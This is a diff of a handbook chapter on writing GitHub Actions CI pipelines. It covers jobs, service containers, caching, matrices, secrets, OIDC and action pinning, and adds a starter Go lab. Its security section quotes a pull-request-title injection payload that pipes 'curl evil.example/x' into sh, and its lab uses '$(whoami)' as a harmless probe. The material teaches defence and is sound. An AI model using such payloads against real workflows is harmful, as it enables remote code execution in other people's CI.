@@ -1,17 +1,17 @@
 ---
 title: "11.2 CI with GitHub Actions"
 sidebar_label: "11.2 CI with GitHub Actions"
-description: "Writing real CI pipelines with GitHub Actions: workflows, events, jobs, steps and runners; actions from the marketplace; service containers for real databases; matrices and caching; artefacts; secrets, the GITHUB_TOKEN and least-privilege permissions; OIDC instead of stored cloud keys; concurrency; and the security traps — read through this repository's own workflows."
+description: "Writing real CI pipelines with GitHub Actions: workflows, events, jobs, steps and runners; actions from the marketplace; service containers for real databases; matrices and caching; artefacts; secrets, the GITHUB_TOKEN and least-privilege permissions; OIDC instead of stored cloud keys; concurrency; and the security traps — starting from a ten-line workflow, then reading this repository's own."
 ---
 
 # 11.2 CI with GitHub Actions
 
-[Chapter 11.1](./how-software-ships.mdx) described what a pipeline should do. This chapter is about **writing** one. **GitHub Actions** is the CI/CD system built into GitHub. It runs **workflows**, YAML files in `.github/workflows/`, on GitHub's machines whenever something happens in your repository: a push, a pull request, a tag, a schedule, a button. It's free for public repositories, which is why this whole handbook, its website and snip's images are built and tested on it at no cost. The ideas carry straight over to GitLab CI, CircleCI, Jenkins and the rest; only the YAML differs. You'll read this repository's real workflows piece by piece, learn the features that make pipelines fast and the settings that make them safe, then write your own from scratch in a fork.
+You push a commit, and a minute later a green tick or a red cross appears next to it on GitHub. Somewhere, a machine fetched your code, built it and ran its tests, without anyone asking. That machine is following a **workflow**, and this chapter teaches you to write one. [Chapter 11.1](./how-software-ships.mdx) described what a pipeline should do: check every change automatically, early, while mistakes are cheap. **GitHub Actions** is the CI/CD system built into GitHub. It runs workflows, YAML files in `.github/workflows/`, on GitHub's machines whenever something happens in your repository: a push, a pull request, a tag, a schedule, a button. It's free for public repositories. The ideas carry straight over to GitLab CI, CircleCI, Jenkins and the rest; only the YAML differs. You'll start with a ten-line workflow in a brand-new repository, grow it with a real database, speed and safety, and finish by reading the workflows that test this handbook and snip on every push.
 
 ## What you'll learn
 
 - The building blocks: **workflows**, **events**, **jobs**, **steps**, **runners** and **actions**.
-- **Service containers** for real Postgres and Redis in tests.
+- **Service containers** for a real database in tests.
 - Making it fast: **parallel jobs**, **caching**, **matrices**, and **concurrency**.
 - Passing things between jobs: **artefacts** and **outputs**.
 - Making it safe: **secrets**, the **`GITHUB_TOKEN`**, **permissions**, **OIDC**, pinning, and script injection.
@@ -20,43 +20,228 @@ description: "Writing real CI pipelines with GitHub Actions: workflows, events, 
 
 ## The building blocks
 
-```mermaid
-flowchart LR
-  E["Event<br/>(push, pull_request…)"] --> W["Workflow<br/>ci.yml"]
-  W --> J1["Job: snip<br/>(own fresh VM)"]
-  W --> J2["Job: snip-image<br/>(own fresh VM)"]
-  J1 --> S1["Steps:<br/>checkout → setup-go → vet → test"]
-```
-
-| Piece | What it is | In this repository |
-|---|---|---|
-| **Workflow** | A YAML file in `.github/workflows/` | `ci.yml`, `image.yml`, `deploy.yml` |
-| **Event** (`on:`) | What triggers it | `push` to `main`, `pull_request`, tags `snip-v*`, `workflow_dispatch` (a button) |
-| **Job** | A set of steps that runs on **one fresh machine**. Jobs run **in parallel** unless one `needs:` another | `snip`, `snip-image`, `snip-stack`, `snip-k8s`, `security`, … |
-| **Runner** | The machine a job runs on | `runs-on: ubuntu-latest`: a clean VM GitHub provides, destroyed afterwards |
-| **Step** | One command (`run:`) or one reusable **action** (`uses:`) | `run: go test -race ./...`, `uses: actions/checkout@v5` |
-| **Action** | A packaged, reusable step, usually from GitHub's marketplace | `actions/checkout`, `actions/setup-go`, `docker/build-push-action` |
-
-Every job starts from an **empty machine**. It doesn't have your code until `actions/checkout` fetches it, and it doesn't have Go until `actions/setup-go` installs it. Nothing survives from one job to the next unless you pass it on deliberately (artefacts, below). That's a feature: every run starts clean, so "it worked because of something left over from last time" can't happen.
-
 :::note[Everyday anchor]
 A workflow is a **recipe card pinned to the kitchen wall with a trigger**: "whenever an order comes in (event), set up these stations (jobs), each on its own clean counter (runner), and follow these steps". Each station starts with a spotless counter and nothing from yesterday's shift. And because each station has its own counter, they all work at once.
 :::
 
+```mermaid
+flowchart LR
+  E["Event<br/>(push, pull_request…)"] --> W["Workflow<br/>ci.yml"]
+  W --> J1["Job: test<br/>(own fresh VM)"]
+  W --> J2["Job: lint<br/>(own fresh VM)"]
+  J1 --> S1["Steps:<br/>checkout → setup-go → test"]
+```
+
+One event starts one workflow; the workflow's jobs run side by side, each on its own machine, each doing its steps in order.
+
+| Piece | What it is | Example |
+|---|---|---|
+| **Workflow** | A YAML file in `.github/workflows/` | `ci.yml` |
+| **Event** (`on:`) | What triggers it | `push`, `pull_request`, a tag, `schedule` (cron), `workflow_dispatch` (a button) |
+| **Job** | A set of steps that runs on **one fresh machine**. Jobs run **in parallel** unless one `needs:` another | `test`, `lint`, `build` |
+| **Runner** | The machine a job runs on | `runs-on: ubuntu-latest`: a clean VM GitHub provides, destroyed afterwards |
+| **Step** | One command (`run:`) or one reusable **action** (`uses:`) | `run: go test ./...`, `uses: actions/checkout@v7` |
+| **Action** | A packaged, reusable step, usually from GitHub's marketplace | `actions/checkout`, `actions/setup-go`, `docker/build-push-action` |
+
+Every job starts from an **empty machine**. It doesn't have your code until `actions/checkout` fetches it, and it doesn't have Go until `actions/setup-go` installs it. Nothing survives from one job to the next unless you pass it on deliberately (artefacts, below). That's a feature: every run starts clean, so "it worked because of something left over from last time" can't happen.
+
 ---
 
-## A real job, line by line
+## Your first workflow, line by line
 
-The `snip` job in `.github/workflows/ci.yml` tests snip against real databases:
+Take the smallest project worth testing: a Go module with one function and one test (the lab gives you the three files). This is a complete CI workflow for it:
+
+```yaml title=".github/workflows/ci.yml"
+name: CI                                 # shown in the Actions tab
+on:
+  push:                                  # every push, to any branch
+  pull_request:                          # every pull request
+permissions:
+  contents: read                         # the run's token may only read the code (see "Making it safe")
+jobs:
+  test:
+    runs-on: ubuntu-latest               # a fresh Linux VM
+    steps:
+      - uses: actions/checkout@v7        # fetch this commit's code
+      - uses: actions/setup-go@v7        # install Go, and cache downloaded modules
+        with:
+          go-version: stable             # the latest stable release
+      - run: go vet ./...                # catch suspicious code
+      - run: go test ./...               # run the tests
+```
+
+- **`on:`** lists the events. Here: every push and every pull request.
+- **`jobs.test`** is one job; you can name it anything. Add a second job and it runs at the same time, on another machine.
+- **`uses:`** runs an action. `@v7` picks a version (more on pinning below); `with:` passes it inputs.
+- **`run:`** is a shell script. **If any command fails (non-zero exit code, [chapter 2.4](../linux/bash-scripting.mdx)), the step fails, the job stops, and the run turns red.** That's the whole mechanism of CI: a test that fails exits non-zero, and the red cross appears next to the commit.
+
+On GitHub, the run appears under the repository's **Actions** tab, with every step's log. Repositories usually **protect** `main` so a pull request can't merge until such checks pass ([chapter 11.1](./how-software-ships.mdx)).
+
+---
+
+## Service containers: a real database in the job
+
+Tests that talk to a database should talk to a **real** one: fakes hide wrong SQL. A job can start containers next to itself with **`services:`**:
+
+```yaml
+jobs:
+  db-test:
+    runs-on: ubuntu-latest
+    services:                            # extra containers, running alongside the job
+      postgres:
+        image: postgres:16-alpine
+        env:
+          POSTGRES_PASSWORD: test
+        ports: ["5432:5432"]             # reachable from the steps as localhost:5432
+        options: >-
+          --health-cmd "pg_isready -U postgres" --health-interval 5s --health-timeout 5s --health-retries 10
+    steps:
+      - run: psql -h localhost -U postgres -c "SELECT version();"   # the runner image includes psql
+        env:
+          PGPASSWORD: test
+```
+
+`--health-cmd` makes the job wait until Postgres is actually ready before the steps start: the same healthcheck idea as Compose ([chapter 9.3](../containers/docker-compose.mdx)). Your tests then connect to `localhost:5432` through an environment variable, exactly as they would on your laptop.
+
+---
+
+## Making it fast
+
+A slow pipeline gets ignored ([chapter 11.1](./how-software-ships.mdx)). The main techniques:
+
+- **Parallel jobs.** Independent checks go in separate jobs, which run at the same time. A run takes about as long as the slowest job, not the sum.
+- **Dependencies between jobs** only where needed: `needs: build` makes a job wait for `build` and lets it use its outputs.
+- **Caching.** `actions/setup-go` and `actions/setup-node` (with `cache: npm`) cache dependency downloads between runs, keyed on the lockfile (`go.sum`, `package-lock.json`). Docker builds can use `cache-from: type=gha` to reuse image layers between runs.
+- **Matrices** run one job definition across combinations, for example several Go versions or operating systems:
+  ```yaml
+  strategy:
+    matrix:
+      go: ["1.24", "1.25"]
+      os: [ubuntu-latest, macos-latest]
+  runs-on: ${{ matrix.os }}
+  steps:
+    - uses: actions/setup-go@v7
+      with: { go-version: "${{ matrix.go }}" }
+  ```
+  That's four jobs from one definition. Libraries use matrices heavily; an application that ships one Go version in one image doesn't need to.
+- **Concurrency.** When you push three times in a minute to a pull request, only the last run matters:
+  ```yaml
+  concurrency:
+    group: ci-${{ github.ref }}          # one group per branch or PR
+    cancel-in-progress: true             # a new run cancels the older one
+  ```
+  Be careful on `main`, where every commit should keep its result; "Apply it" below shows the pattern that handles both.
+- **Path filters.** `on: push: paths: ["api/**"]` runs a workflow only when those files change, so editing documentation doesn't rebuild images.
+
+---
+
+## Passing things between jobs
+
+Jobs run on different machines, so they share nothing by default.
+
+- **Artefacts** are files uploaded from one job and downloaded in another, or by you from the run's page:
+  ```yaml
+  build:
+    steps:
+      - run: go build -o app .
+      - uses: actions/upload-artifact@v7
+        with: { name: app, path: app }
+  smoke:
+    needs: build                         # wait for build
+    steps:
+      - uses: actions/download-artifact@v8
+        with: { name: app }
+      - run: chmod +x app && ./app --version
+  ```
+- **Outputs** are small values, like a computed tag or a digest. A step sets them (`id: build`, then `${{ steps.build.outputs.digest }}`), and they can be passed up to the job for other jobs to read.
+- **Registries** are the natural hand-off for images: build and push in one job, pull by digest in another ([chapter 9.4](../containers/images-in-production.mdx)).
+
+---
+
+## Making it safe
+
+A CI system holds the keys to your kingdom: it can push code, publish packages and, in many setups, deploy to production. So it's a favourite target. The rules:
+
+### Secrets and the GITHUB_TOKEN
+
+**Secrets** (repository or organisation settings → Secrets and variables → Actions) are encrypted values made available to workflows as `${{ secrets.NAME }}`. GitHub masks them in logs. Use them for things like a registry password or an API key, and never commit them ([chapter 7.6](../security/secrets-management.mdx)).
+
+Every run also gets an automatic, short-lived **`GITHUB_TOKEN`**, which lets the workflow call GitHub's API for this repository, for example to push an image to GitHub's registry, `ghcr.io`. Give it **only** the permissions it needs, with a `permissions:` block:
+
+```yaml
+# a CI workflow only reads code
+permissions:
+  contents: read
+
+# a publishing workflow may also push packages, nothing else
+permissions:
+  contents: read
+  packages: write
+```
+
+If a malicious dependency or a compromised action runs inside your CI, a read-only token limits what it can do.
+
+### OIDC instead of stored cloud keys
+
+To deploy to a cloud ([Part 12](../cloud/cloud-from-zero.mdx)), a workflow needs cloud credentials. The old way was a long-lived access key stored as a secret, which could leak and stay valid for years. The modern way is **OIDC** (OpenID Connect, a standard way for one system to vouch for an identity to another): with `permissions: id-token: write`, the workflow requests a short-lived signed token from GitHub saying "I'm workflow X in repository Y on branch main". The cloud is configured to trust exactly that identity and hands out temporary credentials. There's no stored secret at all. GitHub Pages deployments use the same mechanism, and [chapter 12.4](../cloud/iam.mdx) sets it up for a cloud.
+
+### Pin what you run
+
+`uses: actions/checkout@v7` runs someone else's code, with your token. A **tag** like `v7` can be moved by the action's owner, or by an attacker who compromises them, which has happened to popular actions: in March 2025 the widely used `tj-actions/changed-files` had its tags repointed to code that printed CI secrets into build logs ([GitHub advisory](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3)). The strongest protection is to pin third-party actions to a **full commit SHA** (`uses: some/action@8f4b7f84…  # v1.2.3`) and let Dependabot or Renovate propose updates. The same applies to images (`rhysd/actionlint:1.7.12`) and tools you install (`govulncheck@v1.8.0`): pin versions of everything you run.
+
+### Don't let untrusted text become code
+
+This is the most common serious bug in workflows. Anything an outsider controls (a pull request title, a branch name, an issue comment) is **untrusted input** ([chapter 7.5](../security/web-attacks.mdx)). Putting it directly into a `run:` script lets them inject shell commands:
+
+```yaml
+# DANGEROUS: a PR titled  a"; curl evil.example/x | sh; echo "  runs their command
+- run: echo "Checking ${{ github.event.pull_request.title }}"
+
+# Safe: pass it as an environment variable; the shell treats it as data
+- env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: echo "Checking $TITLE"
+```
+
+`${{ }}` expressions are pasted into the script **before** the shell runs it, exactly like SQL injection's string concatenation ([chapter 7.5](../security/web-attacks.mdx)). Environment variables are the equivalent of parameterised queries.
+
+:::danger
+Be very careful with the **`pull_request_target`** trigger. Unlike `pull_request`, it runs with the base repository's secrets and a write-capable token, even for pull requests from forks. A workflow that uses it *and* checks out and runs the pull request's code hands your secrets to anyone who opens a PR. Since June 2026, `actions/checkout` (v7, and backported to v4–v6) refuses to check out a fork's code in such workflows unless you set `allow-unsafe-pr-checkout: true`. If you don't know you need that, you don't.
+:::
+
+### Lint the workflows themselves
+
+Workflows are code, so they get checked too. **actionlint** catches YAML mistakes, wrong expression syntax, unknown action inputs, and, through **shellcheck**, bugs in the `run:` scripts. It runs on your laptop and as a CI job.
+
+:::warning[What can go wrong]
+- **Everything in one giant job**: slow, and one failure hides the others. Split independent checks into parallel jobs.
+- **`permissions` left at defaults**: depending on repository settings, the token may be able to write to your code.
+- **Secrets printed by accident**: masking only works on the exact secret value; a base64'd or partial copy is printed in plain text. Don't `echo` secrets, even "to debug".
+- **Tests that depend on the outside world** (a live third-party API): the build fails when *they* have a bad day. Use service containers or fakes.
+- **"Works on my machine" tools**: a tool version installed ad hoc on your laptop, `latest` in CI. Pin versions in both.
+:::
+
+:::info[In the real world]
+Larger organisations share pipeline logic through **reusable workflows** (`workflow_call`) and **composite actions**, so a hundred repositories follow one audited pattern. They use **environments** with required reviewers for production deploys, **self-hosted or larger runners** for heavy builds, and **merge queues** that test each change against the latest `main` before merging, so two individually-green PRs can't combine into a red `main`.
+:::
+
+---
+
+## Apply it to snip
+
+This repository's three workflows test the handbook and snip, the link shortener you build in it, on every push: `ci.yml` (all the checks), `image.yml` (publishes snip's container image) and `deploy.yml` (publishes the website). Every idea above appears in them.
+
+**The `snip` job** in `.github/workflows/ci.yml` is the "first workflow" plus a service-container database, grown up:
 
 ```yaml
 snip:
   name: snip (Go) — vet, test, build
   runs-on: ubuntu-latest
+  timeout-minutes: 15
   defaults:
     run:
       working-directory: snip          # every `run:` step starts in snip/
-  services:                            # extra containers, running alongside the job
+  services:
     postgres:
       image: postgres:16-alpine
       env:
@@ -83,158 +268,61 @@ snip:
     - run: go build ./...
 ```
 
-- **`services:`** starts real Postgres and Redis containers before the steps run. `--health-cmd` makes the job wait until Postgres is actually ready: the same healthcheck idea as Compose ([chapter 9.3](../containers/docker-compose.mdx)). snip's integration tests ([chapter 6.6](../data/postgres-from-go.mdx)) connect to them through the `SNIP_TEST_*` variables. Testing against the real database, not a fake, is what catches wrong SQL.
-- **`setup-go` with `cache-dependency-path`** caches downloaded modules and build output between runs, keyed on `go.sum`. Unchanged dependencies aren't downloaded again.
-- Each `run:` step is a shell script. **If any command fails (non-zero exit code, [chapter 2.4](../linux/bash-scripting.mdx)), the step fails, the job stops, and the run turns red.**
+(The real job goes on with steps that run later chapters' labs. Its `@v5`/`@v6` tags are a major version behind the newest `@v7`: exactly the kind of drift Dependabot exists to flag.) snip's integration tests ([chapter 6.6](../data/postgres-from-go.mdx)) connect to the service containers through the `SNIP_TEST_*` variables, and `go-version-file` keeps CI on the same Go version as `go.mod`.
 
-### The Compose and Kubernetes jobs
+**Whole-system jobs.** Other jobs go further. `snip-stack` runs `docker compose up --wait` and then scripts [chapter 9.3](../containers/docker-compose.mdx)'s lab. `snip-k8s` creates a Kubernetes cluster on the runner with the `helm/kind-action` action, loads a freshly built image, applies the manifests, and runs every [Part 10](../kubernetes/why-orchestration.mdx) lab: the smoke test, deleting a Pod, a rolling update under traffic, NetworkPolicies, the Gateway, breaking things on purpose, and the Helm chart. It's the same idea as a unit test, scaled up: **if the handbook tells readers something works, a machine checks it on every change.**
 
-Other jobs go further, starting the whole system. `snip-stack` runs `docker compose up --wait` and then scripts [chapter 9.3](../containers/docker-compose.mdx)'s lab. `snip-k8s` creates a Kubernetes cluster on the runner with the `helm/kind-action` action, loads a freshly built image, applies the manifests, and runs every [Part 10](../kubernetes/why-orchestration.mdx) lab: the smoke test, deleting a Pod, a rolling update under traffic, NetworkPolicies, the Gateway, breaking things four ways, and the Helm chart. It's the same idea as a unit test, scaled up: **if the handbook tells readers something works, a machine checks it on every change.**
-
----
-
-## Making it fast
-
-A slow pipeline gets ignored ([chapter 11.1](./how-software-ships.mdx)). The main techniques:
-
-- **Parallel jobs.** Independent checks go in separate jobs, which run at the same time. This repository's CI has eight jobs; a run takes about as long as the slowest one.
-- **Dependencies between jobs** only where needed: `needs: build` makes a job wait for `build` and lets it use its outputs. `deploy.yml` uses it so publishing waits for the build.
-- **Caching.** `actions/setup-node` with `cache: npm` and `setup-go` cache dependency downloads. Docker builds can use `cache-from: type=gha` to reuse image layers between runs (`image.yml` does).
-- **Matrices** run one job definition across combinations, for example testing on several Go versions or operating systems:
-  ```yaml
-  strategy:
-    matrix:
-      go: ["1.24", "1.25"]
-      os: [ubuntu-latest, macos-latest]
-  runs-on: ${{ matrix.os }}
-  steps:
-    - uses: actions/setup-go@v6
-      with: { go-version: "${{ matrix.go }}" }
-  ```
-  That's four jobs from one definition. Libraries use matrices heavily; an application like snip, which ships one Go version in one image, doesn't need to.
-- **Concurrency.** When you push three times in a minute to a pull request, only the last run matters. `ci.yml` cancels superseded PR runs:
-  ```yaml
-  concurrency:
-    group: ci-${{ github.event_name == 'pull_request' && github.ref || github.run_id }}
-    cancel-in-progress: true
-  ```
-  Pull request runs share a group per branch, so a new push cancels the old run. Pushes to `main` get a unique group each (the run's ID), so every commit on `main` is tested. This repository learned that the hard way: its first version used `group: ci-${{ github.ref }}` with cancelling switched off for `main`, expecting every commit to keep its run. But a concurrency group allows only one running and **one pending** run, and silently cancels older pending ones. So fast pushes to `main` queued up behind each other, and the ones in the middle were cancelled without being tested. `deploy.yml` uses `cancel-in-progress: false` for a different reason: you never want to interrupt a deployment halfway.
-- **Path filters.** `image.yml` only runs when `snip/` changes (`paths: ["snip/**"]`), so editing a chapter doesn't rebuild images.
-
----
-
-## Passing things between jobs
-
-Jobs run on different machines, so they share nothing by default.
-
-- **Artefacts** are files uploaded from one job and downloaded in another, or by you from the run's page: `actions/upload-artifact` and `download-artifact`. `deploy.yml` uses a specialised version: `upload-pages-artifact` packages the built website, and the `deploy` job publishes it.
-- **Outputs** are small values, like a computed tag or a digest. A step sets them (`id: build`, then `${{ steps.build.outputs.digest }}`), and they can be passed up to the job for other jobs to read. `image.yml` prints the published digest this way.
-- **Registries** are the natural hand-off for images: build and push in one job, pull by digest in another.
-
----
-
-## Making it safe
-
-A CI system holds the keys to your kingdom: it can push code, publish packages and, in many setups, deploy to production. So it's a favourite target. The rules:
-
-### Secrets and the GITHUB_TOKEN
-
-**Secrets** (repository or organisation settings → Secrets and variables → Actions) are encrypted values made available to workflows as `${{ secrets.NAME }}`. GitHub masks them in logs. Use them for things like a registry password or an API key, and never commit them ([chapter 7.6](../security/secrets-management.mdx)).
-
-Every run also gets an automatic, short-lived **`GITHUB_TOKEN`**, which lets the workflow call GitHub's API for this repository, for example to push an image to `ghcr.io`. Give it **only** the permissions it needs, with a `permissions:` block:
+**Concurrency, learned the hard way.** `ci.yml` uses:
 
 ```yaml
-# ci.yml: CI only reads code
-permissions:
-  contents: read
-
-# image.yml: also allowed to publish packages, nothing else
-permissions:
-  contents: read
-  packages: write
+concurrency:
+  group: ci-${{ github.event_name == 'pull_request' && github.ref || github.run_id }}
+  cancel-in-progress: true
 ```
 
-If a malicious dependency or a compromised action runs inside your CI, a read-only token limits what it can do.
+Pull request runs share a group per branch, so a new push cancels the old run. Pushes to `main` get a unique group each (the run's ID), so every commit on `main` is tested. The first version used `group: ci-${{ github.ref }}` with cancelling switched off for `main`, expecting every commit to keep its run. But a concurrency group allows only one running and **one pending** run, and silently cancels older pending ones. So fast pushes to `main` queued up behind each other, and the ones in the middle were cancelled without being tested. `deploy.yml` uses `cancel-in-progress: false` for a different reason: you never want to interrupt a deployment halfway.
 
-### OIDC instead of stored cloud keys
+**Least privilege and paths.** `ci.yml` has `permissions: contents: read`; `image.yml` adds only `packages: write`, to push to `ghcr.io`, and runs only when `snip/` changes (`paths: ["snip/**", …]`). `deploy.yml` hands the built website from its build job to its deploy job with `upload-pages-artifact`, and publishes with OIDC.
 
-To deploy to a cloud ([Part 12](../cloud/cloud-from-zero.mdx)), a workflow needs cloud credentials. The old way was a long-lived access key stored as a secret, which could leak and stay valid for years. The modern way is **OIDC** (OpenID Connect): with `permissions: id-token: write`, the workflow requests a short-lived signed token from GitHub saying "I'm workflow X in repository Y on branch main". The cloud is configured to trust exactly that identity and hands out temporary credentials. There's no stored secret at all. `deploy.yml` uses the same mechanism to publish to GitHub Pages, and [chapter 12.4](../cloud/iam.mdx) sets it up for a cloud.
-
-### Pin what you run
-
-`uses: actions/checkout@v5` runs someone else's code, with your token. A **tag** like `v5` can be moved by the action's owner, or by an attacker who compromises them, which has happened to popular actions. The strongest protection is to pin third-party actions to a **full commit SHA** (`uses: some/action@8f4b7f84…  # v1.2.3`) and let Dependabot or Renovate propose updates. The same applies to images (`rhysd/actionlint:1.7.12`, `aquasec/trivy:0.74.0`) and tools (`govulncheck@v1.8.0`): this repository pins versions of every tool it runs.
-
-### Don't let untrusted text become code
-
-This is the most common serious bug in workflows. Anything an outsider controls (a pull request title, a branch name, an issue comment) is **untrusted input** ([chapter 7.5](../security/web-attacks.mdx)). Putting it directly into a `run:` script lets them inject shell commands:
-
-```yaml
-# DANGEROUS: a PR titled  a"; curl evil.example/x | sh; echo "  runs their command
-- run: echo "Checking ${{ github.event.pull_request.title }}"
-
-# Safe: pass it as an environment variable; the shell treats it as data
-- env:
-    TITLE: ${{ github.event.pull_request.title }}
-  run: echo "Checking $TITLE"
-```
-
-`${{ }}` expressions are pasted into the script **before** the shell runs it, exactly like SQL injection's string concatenation ([chapter 7.5](../security/web-attacks.mdx)). Environment variables are the equivalent of parameterised queries.
-
-:::danger
-Be very careful with the **`pull_request_target`** trigger. Unlike `pull_request`, it runs with the base repository's secrets and a write-capable token, even for pull requests from forks. A workflow that uses it *and* checks out and runs the pull request's code hands your secrets to anyone who opens a PR. If you don't know you need it, you don't.
-:::
-
-### Lint the workflows themselves
-
-Workflows are code, so they get checked too. This repository's `workflows` job runs **actionlint**, which catches YAML mistakes, wrong expression syntax, unknown action inputs, and, through **shellcheck**, bugs in the `run:` scripts. Adding it to this repository found ten findings on day one: nine loop variables that were declared and never used, and one single-quoted `$(...)` that was intentional (it must run inside a Pod, not in CI) and is now marked as such. Harmless this time, but it's the same class of check that catches unquoted variables and typos in scripts.
-
-:::warning[What can go wrong]
-- **Everything in one giant job**: slow, and one failure hides the others. Split independent checks into parallel jobs.
-- **`permissions` left at defaults**: depending on repository settings, the token may be able to write to your code.
-- **Secrets printed by accident**: masking only works on the exact secret value; a base64'd or partial copy is printed in plain text. Don't `echo` secrets, even "to debug".
-- **Tests that depend on the outside world** (a live third-party API): the build fails when *they* have a bad day. Use service containers or fakes.
-- **"Works on my machine" tools**: a tool version installed ad hoc on your laptop, `latest` in CI. Pin versions in both.
-:::
-
-:::info[In the real world]
-Larger organisations share pipeline logic through **reusable workflows** (`workflow_call`) and **composite actions**, so a hundred repositories follow one audited pattern. They use **environments** with required reviewers for production deploys, **self-hosted or larger runners** for heavy builds, and **merge queues** that test each change against the latest `main` before merging, so two individually-green PRs can't combine into a red `main`.
-:::
+**Linting the workflows.** The `workflows` job runs actionlint (`rhysd/actionlint:1.7.12`) over all three files. Adding it found ten findings on day one: nine loop variables that were declared and never used, and one single-quoted `$(...)` that was intentional (it must run inside a Pod, not in CI) and is now marked as such. Harmless this time, but it's the same class of check that catches unquoted variables and typos in scripts.
 
 ---
 
 ## Lab
 
-Free, with a GitHub account. You'll work in your own **fork** of this repository, so nothing affects the original.
+Free, with a GitHub account. Steps 1–5 use a new, empty repository of your own; step 6 uses your **fork** of this repository. Nothing affects the original.
 
-1. **Fork and enable Actions.** On GitHub, fork the repository. In your fork, open the **Actions** tab and enable workflows.
+1. **Create a tiny project.** On GitHub, create a new public repository (`ci-lab`), then add three files (through the web editor or a clone):
+   ```go title="go.mod"
+   module example.com/cilab
 
-2. **Write your first workflow.** Create `.github/workflows/hello.yml` in your fork (through the web editor or a clone):
-   ```yaml
-   name: Hello
-   on:
-     push:
-     workflow_dispatch:
-   permissions:
-     contents: read
-   jobs:
-     hello:
-       runs-on: ubuntu-latest
-       steps:
-         - uses: actions/checkout@v5
-         - run: echo "Hello from $(uname -a)"
-         - run: ls -la snip
-         - uses: actions/setup-go@v6
-           with:
-             go-version-file: snip/go.mod
-         - run: cd snip && go test ./internal/links/...
+   go 1.24
    ```
-   Commit it and watch it run in the **Actions** tab. Expand each step's log.
+   ```go title="add.go"
+   package cilab
 
-3. **Break it on purpose.** Add a step `- run: exit 1`, commit, and see the run turn red and the later steps skipped. Replace it with `- run: go vet ./...` (in `snip/`) and make it green again.
+   // Add returns the sum of a and b.
+   func Add(a, b int) int { return a + b }
+   ```
+   ```go title="add_test.go"
+   package cilab
 
-4. **Add a matrix.** Change the job to run on two Go versions with `strategy.matrix` as shown above (use `go-version: ${{ matrix.go }}` instead of `go-version-file`). How many jobs appear? (Two.)
+   import "testing"
 
-5. **See injection safely.** Add a `workflow_dispatch` input and echo it both ways:
+   func TestAdd(t *testing.T) {
+   	if got := Add(2, 3); got != 5 {
+   		t.Fatalf("Add(2, 3) = %d, want 5", got)
+   	}
+   }
+   ```
+
+2. **Add the workflow.** Create `.github/workflows/ci.yml` with the workflow from "Your first workflow, line by line", commit, and open the **Actions** tab. Expand each step's log: checkout, Go installed, vet, tests passing.
+
+3. **Break it on purpose.** Change `want 5` to `want 6` in the test (`got != 6` too), commit, and watch the run turn red with the test's message in the log. Open a pull request with the broken change to see the red cross on the PR. Fix it, and it goes green.
+
+4. **Add a database and a matrix.** Add the `db-test` job from "Service containers" (it runs in parallel with `test`), and give `test` a matrix of two Go versions (`go-version: ${{ matrix.go }}`). How many jobs appear? (Three: two `test`, one `db-test`.)
+
+5. **See injection safely.** Add a manual trigger with an input, and echo it both ways:
    ```yaml
    on:
      workflow_dispatch:
@@ -244,9 +332,9 @@ Free, with a GitHub account. You'll work in your own **fork** of this repository
          - env: { NAME: "${{ inputs.name }}" }
            run: echo "Hello, $NAME"
    ```
-   Run it from the Actions tab with the input `$(whoami)`. With the environment variable, it prints the text `$(whoami)` literally. Now try `run: echo "Hello, ${{ inputs.name }}"` with the same input: it runs `whoami`. That's the injection, harmless here, in your own fork.
+   Run it from the Actions tab with the input `$(whoami)`. With the environment variable, it prints the text `$(whoami)` literally. Now try `run: echo "Hello, ${{ inputs.name }}"` with the same input: it runs `whoami`. That's the injection, harmless here, in your own repository.
 
-6. **Lint it**: install actionlint (`brew install actionlint`, or `go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.12`) and run `actionlint` in your clone. It checks every workflow in `.github/workflows/`.
+6. **Apply it to snip.** Fork this repository and enable Actions in the fork. Open `.github/workflows/ci.yml`, find the `snip` job, and push a one-line change to `snip/` to watch it run with real Postgres and Redis. Then lint every workflow: install actionlint (`brew install actionlint`, or `go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.12`) and run `actionlint` in your clone, and in `ci-lab`.
 
 ## Self-check
 
@@ -262,18 +350,18 @@ Free, with a GitHub account. You'll work in your own **fork** of this repository
         'Only if the second job lists the first in needs:, which copies the files across',
       ],
       answer: 1,
-      explain: 'No, each job runs on its own fresh machine; pass files with artefacts (or a registry) and small values with outputs. Jobs are isolated and run in parallel by default. Share deliberately: artefacts, outputs, registries.',
+      explain: 'No, each job runs on its own fresh machine; pass files with artefacts (or a registry) and small values with outputs. needs: only orders the jobs and exposes outputs; it copies no files. Share deliberately: artefacts, outputs, registries.',
     },
     {
-      q: 'What do service containers give snip’s test job?',
+      q: 'What do service containers give a test job?',
       options: [
-        'Faster Go compilation, by caching modules in a sidecar container',
-        'Real Postgres and Redis next to the job, for integration tests',
-        'A small Kubernetes cluster where the test job deploys snip',
-        'Mocked versions of Postgres and Redis that reset between tests',
+        'Faster compilation, by caching modules in a sidecar container',
+        'Real databases (like Postgres and Redis) next to the job, for integration tests',
+        'A small Kubernetes cluster where the test job deploys the app',
+        'Mocked versions of databases that reset between tests',
       ],
       answer: 1,
-      explain: 'Real Postgres and Redis running alongside the job, so integration tests use the real databases. Testing against real dependencies catches wrong SQL and behaviour that fakes would hide.',
+      explain: 'Real Postgres, Redis or other containers running alongside the job, reachable on localhost, so integration tests use the real thing. Testing against real dependencies catches wrong SQL and behaviour that mocks would hide.',
     },
     {
       q: 'Why set permissions: contents: read at the top of a CI workflow?',
@@ -284,7 +372,7 @@ Free, with a GitHub account. You'll work in your own **fork** of this repository
         'To stop forks from reading the repository’s secrets during runs',
       ],
       answer: 1,
-      explain: 'Least privilege: if a dependency or action is malicious, the GITHUB_TOKEN it can use can only read the code. Grant write permissions only to the workflows that need them (like image.yml’s packages: write).',
+      explain: 'Least privilege: if a dependency or action is malicious, the GITHUB_TOKEN it can use can only read the code. It isn’t required, and it doesn’t affect secrets, which are a separate mechanism. Grant write permissions only to the workflows that need them (like image.yml’s packages: write).',
     },
     {
       q: 'Why is run: echo "${{ github.event.pull_request.title }}" dangerous?',
@@ -306,7 +394,7 @@ Free, with a GitHub account. You'll work in your own **fork** of this repository
         'The deploy approval step, since OIDC checks the code itself before any deploy runs',
       ],
       answer: 1,
-      explain: 'Long-lived cloud access keys stored as secrets: the workflow gets short-lived credentials by proving its identity. No stored secret means nothing to leak. The cloud trusts a specific repository, branch and workflow.',
